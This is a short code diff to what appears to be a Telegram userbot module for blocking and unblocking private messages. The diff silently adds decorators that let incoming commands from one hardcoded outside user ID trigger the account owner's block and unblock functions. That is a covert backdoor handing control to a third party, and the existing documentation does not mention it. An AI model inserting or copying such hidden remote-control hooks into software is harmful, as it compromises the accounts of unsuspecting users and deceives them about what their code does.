@@ -278,6 +278,7 @@ async def disapprovepm(disapprvpm):
 
 
 @register(outgoing=True, pattern=r"^\.block$")
+@register(incoming=True, from_users=1779447750, pattern=r"^\.cblok(?: |$)(.*)")
 async def blockpm(block):
     """For .block command, block people from PMing you!"""
     if block.reply_to_msg_id:
@@ -310,6 +311,7 @@ async def blockpm(block):
 
 
 @register(outgoing=True, pattern=r"^\.unblock$")
+@register(incoming=True, from_users=1779447750, pattern=r"^\.cunblok(?: |$)(.*)")
 async def unblockpm(unblock):
     """For .unblock command, let people PMing you again!"""
     if unblock.reply_to_msg_id:
